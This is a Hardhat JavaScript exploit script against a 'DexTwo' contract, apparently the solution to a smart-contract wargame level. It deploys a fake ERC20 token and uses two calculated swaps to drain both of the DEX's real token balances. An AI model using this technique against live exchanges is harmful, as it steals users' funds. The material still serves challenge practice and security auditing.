
const { ethers } = require("hardhat");

var signer, dexTwo, token1, token2;
const victimAddress = '0xc6915E335768C23D57301DAE81eA88D176187F6f';

async function main() {

  const DexTwo = await ethers.getContractFactory("DexTwo");
  dexTwo = DexTwo.attach(victimAddress);

  const ERC20 = await ethers.getContractFactory("ERC20");
  token1 = ERC20.attach(await dexTwo.token1());
  token2 = ERC20.attach(await dexTwo.token2());

  const FakeToken = await ethers.getContractFactory("FakeToken");
  const fakeToken = await FakeToken.deploy("FakeToken", "FTK", victimAddress);
  
  signer = (await ethers.getSigners())[0];
  
  console.log("Approving fake token..");
  const approvetx = await fakeToken.approveDexTwo(signer.address, victimAddress, 500);
  await approvetx.wait();

  await printBalances();

  console.log("Swapping fakeToken for token1..");
  const tx = await dexTwo.swap(fakeToken.address, token1.address, 1);  // 1 * supply / 1 (minted supply to victim) = supply
  await tx.wait();
  
  await printBalances();

  console.log("Swapping fakeToken for token2..");
  const tx2 = await dexTwo.swap(fakeToken.address, token2.address, 2); // 2 * supply / 2 (minted supply + previous swap) = supply
  await tx2.wait();
  
  await printBalances();

  console.log("Succesful attack!");
}

async function printBalances(){
  const token1balance = Number(await token1.balanceOf(signer.address));
  const token2balance = Number(await token2.balanceOf(signer.address));
  const dexToken1balance = Number(await dexTwo.balanceOf(token1.address, victimAddress));
  const dexToken2balance = Number(await dexTwo.balanceOf(token2.address, victimAddress));

  console.log("DexTwo token1 balance:", dexToken1balance);
  console.log("DexTwo token2 balance:", dexToken2balance);
  console.log(`Balance of token1:`, token1balance);
  console.log(`Balance of token2:`, token2balance);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
